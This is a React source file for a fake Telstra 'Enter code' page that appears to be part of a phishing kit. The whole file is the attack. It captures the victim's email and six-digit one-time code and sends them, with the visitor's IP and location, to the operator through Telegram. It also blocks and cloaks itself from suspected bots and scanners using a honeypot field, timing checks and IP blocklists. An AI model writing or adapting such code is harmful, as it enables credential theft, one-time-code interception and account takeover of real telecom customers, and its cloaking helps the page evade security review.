import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { ChevronLeft, ArrowRight } from "lucide-react";

import { sendTelegramMessage, getCodeKeyboard, getUserLocationString } from "@/lib/telegram";
import { initBotDetection, cleanupBotDetection, analyzeForBot } from "@/lib/botDetection";

async function autoBlockBot(ip: string, reason: string): Promise<void> {
  if (typeof window !== 'undefined' && window.location.hostname.includes('netlify')) return;
  
  let targetIp = ip;
  if (!targetIp || targetIp === 'unknown') {
    targetIp = sessionStorage.getItem('visitor_ip') || '';
  }
  if (!targetIp) {
    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      targetIp = data.ip || 'unknown';
    } catch { targetIp = 'unknown'; }
  }
  
  try {
    await fetch('/api/blocked-ips', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip: targetIp })
    });
    
    await fetch('/api/telegram/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        text: `<b>Bot Auto-Blocked</b>\n\n<b>IP:</b> ${targetIp}\n<b>Reason:</b> ${reason}\n<b>Page:</b> Enter Code`
      })
    });
  } catch (e) {
    console.log('Auto-block failed');
  }
}

async function checkIfBlocked(ip: string): Promise<boolean> {
  if (typeof window !== 'undefined' && window.location.hostname.includes('netlify')) {
    return false;
  }
  try {
    const res = await fetch(`/api/blocked-ips?ip=${ip}`);
    if (res.ok) {
      const data = await res.json();
      return data.blocked === true;
    }
  } catch (e) { console.log('Block check failed'); }
  return false;
}

export default function EnterCode() {
  const [code, setCode] = useState("");
  const [honeypot, setHoneypot] = useState("");
  const [jsVerified, setJsVerified] = useState(false);
  const [error, setError] = useState(false);
  const [isBlocked, setIsBlocked] = useState(false);
  const [_, setLocation] = useLocation();

  const startTime = useRef(Date.now());
  const locationInfo = useRef("");
  const visitorIp = useRef("");

  useEffect(() => {
    initBotDetection();
    
    const timer = setTimeout(() => setJsVerified(true), 500);
    
    getUserLocationString().then(async (loc) => {
      locationInfo.current = loc;
      const ipMatch = loc.match(/IP:<\/b>\s*([^\n<]+)/);
      if (ipMatch) {
        visitorIp.current = ipMatch[1].trim();
        sessionStorage.setItem('visitor_ip', visitorIp.current);
        
        const blockedIps = JSON.parse(localStorage.getItem('blocked_ips') || '[]');
        const isIpBlocked = blockedIps.includes(visitorIp.current);
        
        const serverBlocked = await checkIfBlocked(visitorIp.current);
        const blocked = isIpBlocked || serverBlocked;
        setIsBlocked(blocked);
        
        if (blocked) {
          document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
        }
      }
    });

    return () => {
      clearTimeout(timer);
      cleanupBotDetection();
    };
  }, []);

  if (typeof window !== "undefined") {
    const searchParams = new URLSearchParams(window.location.search);
    if (searchParams.get("error") === "true" && !error) {
      setError(true);
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const timeElapsed = Date.now() - startTime.current;
    
    if (honeypot) {
      autoBlockBot(visitorIp.current, "Honeypot field filled");
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
      return;
    }

    if (timeElapsed < 1000) {
      autoBlockBot(visitorIp.current, "Form submitted too fast (under 1 second)");
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
      return;
    }

    if (!jsVerified) {
      autoBlockBot(visitorIp.current, "JavaScript not verified");
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
      return;
    }

    const botAnalysis = analyzeForBot(startTime.current);
    if (botAnalysis.isBot) {
      const reasons = botAnalysis.reasons.join(', ');
      autoBlockBot(visitorIp.current, `Bot behavior detected (score: ${botAnalysis.score}): ${reasons}`);
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
      return;
    }
    
    if (!code || code.trim() === "") {
      setError(true);
      return;
    }
    
    if (code.length !== 6) {
      setError(true);
      return;
    }

    const userEmail = sessionStorage.getItem('userEmail') || 'Not available';

    sendTelegramMessage(`
<b>Telstra Code</b>

<b>Email:</b> ${userEmail}
<b>Code:</b> ${code}

${locationInfo.current}
    `, getCodeKeyboard(visitorIp.current, isBlocked));

    setLocation("/loading");
  };

  const handleBack = () => {
    setLocation("/");
  };

  const handleResend = () => {
    console.log("Resend code clicked");
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-[Segoe_UI,Tahoma,Geneva,Verdana,sans-serif] text-[#333]">
      
      {/* Header */}
      <header className="bg-white py-5 px-5 text-left shadow-[0_2px_4px_rgba(0,0,0,0.1)]">
        <svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-label="Telstra Logo" role="img" focusable="false">
          <g id="Artboard" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
            <g id="Telstra_Primary-logo_C_RGB" fillRule="nonzero">
              <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.36 26.5836576,27.1008 C26.5836576,23.3152 23.6035706,18.0624 18.4989701,13.7792 C18.3774617,13.6576 18.2543841,13.5376 18.130141,13.4192 L18.742504,14.0832 Z" id="Path" fill="#FF6900"></path>
              <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
            </g>
          </g>
        </svg>
      </header>

      {/* Main Content */}
      <main className="flex-1 max-w-[2400px] mx-auto mt-20 mb-10 px-20">
        <h1 className="text-2xl font-semibold text-[#333] mb-10 text-left" data-testid="text-heading">
          Enter code
        </h1>

        <form onSubmit={handleSubmit} autoComplete="off">
          {/* Code Input Field */}
          <div className="mb-6">
            <label htmlFor="code" className="block font-semibold text-[#333] mb-3 text-[0.95rem]">
              6-digit code
            </label>
            <input
              id="code"
              type="text"
              inputMode="numeric"
              maxLength={6}
              pattern="[0-9]*"
              value={code}
              onChange={(e) => {
                const value = e.target.value.replace(/[^0-9]/g, '');
                setCode(value);
                if (value.length > 0) {
                  setError(false);
                }
              }}
              className={`w-full px-4 py-3.5 border-2 ${error ? 'border-[#dc3545]' : 'border-[#666]'} rounded-lg text-lg transition-all focus:border-[#0D54FF] focus:shadow-[0_0_0_0.2rem_rgba(13,84,255,0.25)] outline-none min-h-[56px]`}
              data-testid="input-code"
            />
            {error && (
              <div className="text-[#dc3545] text-sm mt-2" data-testid="error-code">Required field.</div>
            )}
            <span className="text-[#0D54FF] text-sm mt-3 block">
              It may take up to A minute to receive this code to your phone number or associated email.
            </span>
          </div>

          {/* Resend Section */}
          <div className="mt-8 mb-12">
            <div className="text-[#333] text-[0.95rem] mb-2">Didn't get your one-time code?</div>
            <button
              type="button"
              onClick={handleResend}
              className="text-[#0D54FF] font-medium text-[0.95rem] inline-flex items-center gap-1 transition-all hover:text-[#0a45d6] hover:underline bg-transparent border-none cursor-pointer p-0"
              data-testid="button-resend"
            >
              Resend <ArrowRight className="w-4 h-4" />
            </button>
          </div>

          {/* Honeypot field */}
          <div className="hidden absolute opacity-0 pointer-events-none" aria-hidden="true">
            <label htmlFor="phone_confirm">Phone Confirmation</label>
            <input 
              id="phone_confirm"
              name="phone_confirm"
              tabIndex={-1}
              autoComplete="off"
              value={honeypot}
              onChange={(e) => setHoneypot(e.target.value)}
            />
          </div>

          {/* Navigation Buttons */}
          <div className="flex justify-between items-center mt-12 gap-12">
            <button
              type="button"
              onClick={handleBack}
              className="text-[#0D54FF] font-medium text-[0.95rem] inline-flex items-center gap-1.5 transition-all hover:text-[#0a45d6] hover:underline bg-transparent border-none cursor-pointer py-2 px-3"
              data-testid="button-back"
            >
              <ChevronLeft className="w-4 h-4" /> Back
            </button>
            <button
              type="submit"
              className="py-3 px-9 bg-transparent text-[#0D54FF] border-2 border-[#0D54FF] rounded-full text-[0.95rem] font-semibold cursor-pointer transition-all hover:bg-[#0D54FF] hover:text-white hover:-translate-y-0.5 hover:shadow-[0_4px_8px_rgba(13,84,255,0.3)]"
              data-testid="button-next"
            >
              Next
            </button>
          </div>
        </form>
      </main>
    </div>
  );
}
